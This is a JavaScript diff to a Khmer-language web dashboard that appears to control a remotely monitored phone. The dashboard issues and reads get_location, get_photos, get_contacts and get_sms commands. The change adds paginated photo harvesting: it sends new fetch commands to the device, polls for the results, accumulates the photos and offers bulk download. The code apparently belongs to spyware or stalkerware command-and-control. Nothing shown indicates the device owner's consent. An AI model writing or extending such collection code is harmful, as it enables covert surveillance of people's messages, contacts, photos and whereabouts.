@@ -498,6 +498,10 @@ let token = params.get('token');
 let userId = params.get('user_id');
 let targetTab = params.get('tab') || 'location'; // Default to location tab
 let commandData = {};
+let allPhotos = []; // Accumulated photos from all pagination commands
+let photosOffset = 0; // Current offset for next page
+const photosPerPage = 20;
+let isLoadingMore = false;
 let map = null;
 let standardLayer = null;
 let satelliteLayer = null;
@@ -598,15 +602,30 @@ async function loadData() {
     const commands = await api(`/device/commands?user_id=${userId}&limit=200`);
     
     const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);
-    const photosCmd = commands.find(c => c.command_type === 'get_photos' && c.result_data);
-    const contactsCmd = commands.find(c => c.command_type === 'get_contacts' && c.result_data);
-    const smsCmd = commands.find(c => c.command_type === 'get_sms' && c.result_data);
+    
+    // Accumulate photos from ALL get_photos commands (for pagination)
+    const photosCmds = commands
+      .filter(c => c.command_type === 'get_photos' && c.result_data)
+      .sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
+    
+    allPhotos = [];
+    const seenIds = new Set();
+    for (const cmd of photosCmds) {
+      const photos = cmd.result_data?.photos || [];
+      for (const p of photos) {
+        if (!seenIds.has(p.id)) {
+          seenIds.add(p.id);
+          allPhotos.push(p);
+        }
+      }
+    }
+    photosOffset = allPhotos.length;
     
     commandData = {
       location: locationCmd?.result_data,
-      photos: photosCmd?.result_data,
-      contacts: contactsCmd?.result_data,
-      sms: smsCmd?.result_data,
+      photos: allPhotos.length > 0 ? { photos: allPhotos, count: allPhotos.length } : null,
+      contacts: commands.find(c => c.command_type === 'get_contacts' && c.result_data)?.result_data,
+      sms: commands.find(c => c.command_type === 'get_sms' && c.result_data)?.result_data,
     };
     
     document.getElementById('pageMeta').textContent = `User ID: ${userId}`;
@@ -793,7 +812,7 @@ function renderLocation() {
 
 function renderPhotos() {
   const data = commandData.photos;
-  if (!data || !data.photos) {
+  if (!data || !data.photos || data.photos.length === 0) {
     document.getElementById('photosStats').innerHTML = '';
     document.getElementById('photosContent').innerHTML = `
       <div class="empty">
@@ -805,11 +824,12 @@ function renderPhotos() {
   }
   
   const photos = data.photos;
+  const hasMore = photos.length >= photosPerPage && photos.length % photosPerPage === 0;
   
   document.getElementById('photosStats').innerHTML = `
     <div class="stat-card">
       <div class="stat-value">${photos.length}</div>
-      <div class="stat-label">🖼️ រូបភាពទាំងអស់</div>
+      <div class="stat-label">🖼️ បានផ្ទុក</div>
     </div>
     <div class="stat-card">
       <div class="stat-value">${(photos.reduce((sum, p) => sum + (p.size || 0), 0) / 1024 / 1024).toFixed(2)} MB</div>
@@ -821,7 +841,7 @@ function renderPhotos() {
     </div>
   `;
   
-  // Add date filter UI
+  // Add date filter UI and photos grid
   document.getElementById('photosContent').innerHTML = `
     <div style="background: #f5f7fa; padding: 20px; border-radius: 12px; margin-bottom: 20px;">
       <div style="display: flex; gap: 16px; align-items: flex-end; flex-wrap: wrap;">
@@ -843,32 +863,112 @@ function renderPhotos() {
       <div id="photoFilterStatus" style="margin-top: 12px; font-size: 13px; color: #666;"></div>
     </div>
     <div id="photosGrid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px;">
-      ${photos.map(p => `
-        <div style="background: white; border: 2px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: all 0.3s; cursor: pointer;" 
-             onmouseover="this.style.borderColor='#667eea'; this.style.transform='translateY(-4px)';"
-             onmouseout="this.style.borderColor='#e0e0e0'; this.style.transform='translateY(0)';"
-             onclick="viewPhotoDetail(${p.id})">
-          <div style="width: 100%; height: 200px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; overflow: hidden;">
-            ${p.thumbnail ? 
-              `<img src="data:image/jpeg;base64,${p.thumbnail}" style="width: 100%; height: 100%; object-fit: cover;" />` :
-              `<div style="color: #999; font-size: 48px;">🖼️</div>`
-            }
-          </div>
-          <div style="padding: 12px;">
-            <div style="font-weight: 600; font-size: 13px; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
-              ${esc(p.name || 'Unknown')}
-            </div>
-            <div style="font-size: 11px; color: #666; margin-top: 4px;">
-              ${dt(p.date)} • ${(p.size / 1024).toFixed(1)} KB
-            </div>
-            <div style="font-size: 11px; color: #999; margin-top: 2px;">
-              ${p.width}x${p.height}
-            </div>
-          </div>
+      ${photos.map(p => renderPhotoCard(p)).join('')}
+    </div>
+    ${hasMore ? `
+      <div style="text-align: center; margin-top: 24px;">
+        <button id="loadMoreBtn" onclick="loadMorePhotos()" style="padding: 14px 32px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; font-family: inherit; font-size: 15px; transition: all 0.3s; box-shadow: 0 4px 16px rgba(102, 126, 234, 0.4);" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.5)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 16px rgba(102, 126, 234, 0.4)';">
+          📥 ផ្ទុកបន្ថែម (20 រូប)
+        </button>
+      </div>
+    ` : ''}
+  `;
+}
+
+function renderPhotoCard(p) {
+  return `
+    <div style="background: white; border: 2px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: all 0.3s; cursor: pointer;" 
+         onmouseover="this.style.borderColor='#667eea'; this.style.transform='translateY(-4px)';"
+         onmouseout="this.style.borderColor='#e0e0e0'; this.style.transform='translateY(0)';"
+         onclick="viewPhotoDetail(${p.id})">
+      <div style="width: 100%; height: 200px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; overflow: hidden;">
+        ${p.thumbnail ? 
+          `<img src="data:image/jpeg;base64,${p.thumbnail}" style="width: 100%; height: 100%; object-fit: cover;" />` :
+          `<div style="color: #999; font-size: 48px;">🖼️</div>`
+        }
+      </div>
+      <div style="padding: 12px;">
+        <div style="font-weight: 600; font-size: 13px; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+          ${esc(p.name || 'Unknown')}
         </div>
-      `).join('')}
+        <div style="font-size: 11px; color: #666; margin-top: 4px;">
+          ${dt(p.date)} • ${(p.size / 1024).toFixed(1)} KB
+        </div>
+        <div style="font-size: 11px; color: #999; margin-top: 2px;">
+          ${p.width}x${p.height}
+        </div>
+      </div>
     </div>
   `;
+}
+
+async function loadMorePhotos() {
+  if (isLoadingMore) return;
+  isLoadingMore = true;
+  
+  const btn = document.getElementById('loadMoreBtn');
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> កំពុងទាញយក...';
+    btn.style.opacity = '0.6';
+  }
+  
+  try {
+    // Send command to fetch next page
+    await api('/device/command', {
+      method: 'POST',
+      body: {
+        user_id: parseInt(userId),
+        command_type: 'get_photos',
+        payload: { limit: photosPerPage, offset: photosOffset }
+      }
+    });
+    
+    // Poll for result (max 60 seconds)
+    let newPhotos = [];
+    for (let i = 0; i < 30; i++) {
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      const commands = await api(`/device/commands?user_id=${userId}&limit=10`);
+      const latestCmd = commands.find(c => 
+        c.command_type === 'get_photos' && 
+        c.result_data &&
+        c.result_data.offset === photosOffset
+      );
+      
+      if (latestCmd) {
+        newPhotos = latestCmd.result_data.photos || [];
+        break;
+      }
+    }
+    
+    if (newPhotos.length > 0) {
+      // Add new photos to accumulated list (deduplicate by id)
+      const seenIds = new Set(allPhotos.map(p => p.id));
+      for (const p of newPhotos) {
+        if (!seenIds.has(p.id)) {
+          allPhotos.push(p);
+        }
+      }
+      photosOffset = allPhotos.length;
+      commandData.photos = { photos: allPhotos, count: allPhotos.length };
+      
+      // Re-render photos grid
+      renderPhotos();
+      
+      // Scroll to bottom to show new photos
+      setTimeout(() => {
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+      }, 100);
+    } else {
+      alert('មិនមានរូបភាពបន្ថែមទេ');
+    }
+  } catch (error) {
+    console.error('Load more error:', error);
+    alert('❌ មិនអាចផ្ទុករូបភាពបន្ថែម: ' + error.message);
+  } finally {
+    isLoadingMore = false;
+  }
 }
 
 function applyPhotoDateFilter() {
@@ -880,7 +980,7 @@ function applyPhotoDateFilter() {
     return;
   }
   
-  const photos = commandData.photos?.photos || [];
+  const photos = allPhotos.length > 0 ? allPhotos : (commandData.photos?.photos || []);
   const filtered = photos.filter(p => {
     const photoDate = new Date(p.date > 10000000000 ? p.date : p.date * 1000);
     const photoDateStr = photoDate.toISOString().split('T')[0];
@@ -948,7 +1048,7 @@ function renderFilteredPhotos(photos, dateFrom, dateTo) {
 }
 
 function viewPhotoDetail(photoId) {
-  const photos = commandData.photos?.photos || [];
+  const photos = allPhotos.length > 0 ? allPhotos : (commandData.photos?.photos || []);
   const currentIndex = photos.findIndex(p => p.id === photoId);
   if (currentIndex === -1) return;
   
@@ -998,7 +1098,8 @@ function viewPhotoDetail(photoId) {
 }
 
 function downloadSinglePhoto(photoId) {
-  const photo = commandData.photos?.photos?.find(p => p.id === photoId);
+  const photos = allPhotos.length > 0 ? allPhotos : (commandData.photos?.photos || []);
+  const photo = photos.find(p => p.id === photoId);
   if (!photo || !photo.thumbnail) {
     alert('មិនមានរូបភាពសម្រាប់ download');
     return;
@@ -1013,7 +1114,7 @@ function downloadSinglePhoto(photoId) {
 }
 
 function downloadAllPhotos() {
-  const photos = commandData.photos?.photos || [];
+  const photos = allPhotos.length > 0 ? allPhotos : (commandData.photos?.photos || []);
   if (photos.length === 0) {
     alert('មិនមានរូបភាពសម្រាប់ download');
     return;
